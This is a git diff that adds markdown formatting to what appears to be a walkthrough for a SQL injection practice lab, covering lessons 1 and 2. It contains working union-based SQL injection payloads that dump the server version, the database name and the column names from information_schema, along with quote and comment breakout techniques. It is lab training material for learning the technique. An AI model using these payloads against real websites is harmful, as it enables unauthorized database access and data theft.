@@ -11,27 +11,27 @@ git clone the repository of the lab and start all the services.
 
 The website says,Please input the ID as parameter with numeric value.
 So we can input ```?id=1 or 2,3,4,5.....```
-when we put ' we get sql error 
+when we put ```'``` we get sql error 
 thus we have a sql injection
-we can comment ou the rest of the query by -- - or other comments in sql language.
+we can comment ou the rest of the query by ```-- -``` or other comments in sql language.
 We can dump contents
 
- payloads to dump
- We can get version of the server by using /?id=-1' union select 1,version(),3--+
- We can get databasename of the server by using /?id=-1' union select 1,database(),3--+  databasename = security
- Going to the terminal and going to mysql. If we type show databases; it shows databases
- Then we can security also. We can find more details using "use security we can go into the database.
- Using show tables; we can see the tables. For looking into the tables desc emails; and so on...
+ ## *payloads to dump*
+ We can get version of the server by using ```/?id=-1' union select 1,version(),3--+```
+ We can get databasename of the server by using ```/?id=-1' union select 1,database(),3--+  databasename = security```
+ Going to the terminal and going to mysql. If we type ``show databases;`` it shows databases
+Then We can see security which is our database name. We can find more details ``use security`` with this sql command go into the database.
+ Using ``show tables;`` we can see the tables. For looking into the tables ``desc emails;`` and so on...
  
-#LESS2
+### LESS2
 The website says,Please input the ID as parameter with numeric value.
-This time when we input use ?id=1'-- - doesn't work.
-So we put ' before the 1 and change it as ?id='1' as payload.
-Now we can comment it ?id='1' -- - 
+This time when we input use ```?id=1'-- -``` doesn't work.
+So we put ``'`` before the 1 and change it as ```?id='1'``` as payload.
+Now we can comment it ```?id='1' -- - ```
 Now we can dump contents using the payloads.
 
-#payloads to dump
-to find column_name ?id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
+## payloads to dump
+to find column_name ```?id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```
 We have more payloads that can we do and get contents of database
 
 #LESS3
